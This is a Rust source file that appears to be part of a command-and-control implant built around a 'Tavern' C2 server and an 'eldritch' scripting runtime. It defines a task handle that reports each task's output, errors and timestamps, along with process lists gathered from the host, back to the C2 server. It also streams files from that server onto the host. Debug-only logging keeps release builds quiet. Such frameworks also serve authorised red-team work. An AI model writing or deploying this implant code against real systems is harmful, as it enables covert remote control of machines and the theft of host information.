use anyhow::Result;
use c2::{
    pb::{
        DownloadFileRequest, ReportProcessListRequest, ReportTaskOutputRequest, TaskError,
        TaskOutput,
    },
    TavernClient,
};
use eldritch::runtime::FileRequest;
use tokio::task::JoinHandle;

/*
 * Task handle is responsible for tracking a running task and reporting it's output.
 */
pub struct TaskHandle {
    id: i64,
    task: JoinHandle<()>,
    eldritch: eldritch::Broker,
    download_handles: Vec<JoinHandle<()>>,
}

impl TaskHandle {
    // Track a new task handle.
    pub fn new(id: i64, eldritch: eldritch::Broker, task: JoinHandle<()>) -> TaskHandle {
        TaskHandle {
            id,
            task,
            eldritch,
            download_handles: Vec::new(),
        }
    }

    // Returns true if the task has been completed, false otherwise.
    pub fn is_finished(&self) -> bool {
        // Check File Downloads
        for handle in &self.download_handles {
            if !handle.is_finished() {
                return false;
            }
        }

        // Check Task
        self.task.is_finished()
    }

    // Report any available task output.
    // Also responsible for downloading any files requested by the eldritch runtime.
    pub async fn report(&mut self, tavern: &mut TavernClient) -> Result<()> {
        let exec_started_at = self.eldritch.get_exec_started_at();
        let exec_finished_at = self.eldritch.get_exec_finished_at();
        let text = self.eldritch.collect_text();
        let err = self.eldritch.collect_errors().pop().map(|err| TaskError {
            msg: err.to_string(),
        });

        #[cfg(debug_assertions)]
        log::info!(
            "collected task output: task_id={}, exec_started_at={}, exec_finished_at={}, output={}, error={}",
            self.id,
            match exec_started_at.clone() {
                Some(t) => t.to_string(),
                None => String::from(""),
            },
            match exec_finished_at.clone() {
                Some(t) => t.to_string(),
                None => String::from(""),
            },
            text.join(""),
            match err.clone() {
                Some(_err) => _err.msg,
                None => String::from(""),
            }
        );

        if !text.is_empty()
            || err.is_some()
            || exec_started_at.is_some()
            || exec_finished_at.is_some()
        {
            #[cfg(debug_assertions)]
            log::info!("reporting task output: task_id={}", self.id);

            tavern
                .report_task_output(ReportTaskOutputRequest {
                    output: Some(TaskOutput {
                        id: self.id,
                        output: text.join(""),
                        error: err,
                        exec_started_at,
                        exec_finished_at,
                    }),
                })
                .await?;
        }

        // Report Process Lists
        let process_lists = self.eldritch.collect_process_lists();
        for list in process_lists {
            #[cfg(debug_assertions)]
            log::info!("reporting process list: len={}", list.list.len());

            match tavern
                .report_process_list(ReportProcessListRequest {
                    task_id: self.id,
                    list: Some(list),
                })
                .await
            {
                Ok(_) => {}
                Err(_err) => {
                    #[cfg(debug_assertions)]
                    log::error!(
                        "failed to report process list: task_id={}: {}",
                        self.id,
                        _err
                    );
                }
            }
        }

        // Download Files
        let file_reqs = self.eldritch.collect_file_requests();
        for req in file_reqs {
            let name = req.name();
            match self.start_file_download(tavern, req).await {
                Ok(_) => {
                    #[cfg(debug_assertions)]
                    log::info!("started file download: task_id={}, name={}", self.id, name);
                }
                Err(_err) => {
                    #[cfg(debug_assertions)]
                    log::error!(
                        "failed to download file: task_id={}, name={}: {}",
                        self.id,
                        name,
                        _err
                    );
                }
            }
        }
        Ok(())
    }

    async fn start_file_download(
        &mut self,
        tavern: &mut TavernClient,
        req: FileRequest,
    ) -> Result<()> {
        let mut stream = tavern
            .download_file(DownloadFileRequest { name: req.name() })
            .await?
            .into_inner();

        let task_id = self.id;
        let handle = tokio::task::spawn(async move {
            loop {
                let resp = match stream.message().await {
                    Ok(maybe_resp) => match maybe_resp {
                        Some(r) => r,
                        None => {
                            return;
                        }
                    },
                    Err(_err) => {
                        #[cfg(debug_assertions)]
                        log::error!(
                            "failed to download file chunk: task_id={}, name={}: {}",
                            task_id,
                            req.name(),
                            _err
                        );

                        return;
                    }
                };

                #[cfg(debug_assertions)]
                log::info!(
                    "downloaded file chunk: task_id={}, name={}, size={}",
                    task_id,
                    req.name(),
                    resp.chunk.len()
                );

                match req.send_chunk(resp.chunk) {
                    Ok(_) => {}
                    Err(_err) => {
                        #[cfg(debug_assertions)]
                        log::error!(
                            "failed to send downloaded file chunk: task_id={}, name={}: {}",
                            task_id,
                            req.name(),
                            _err
                        );
                        return;
                    }
                };
            }
        });
        self.download_handles.push(handle);
        Ok(())
    }
}
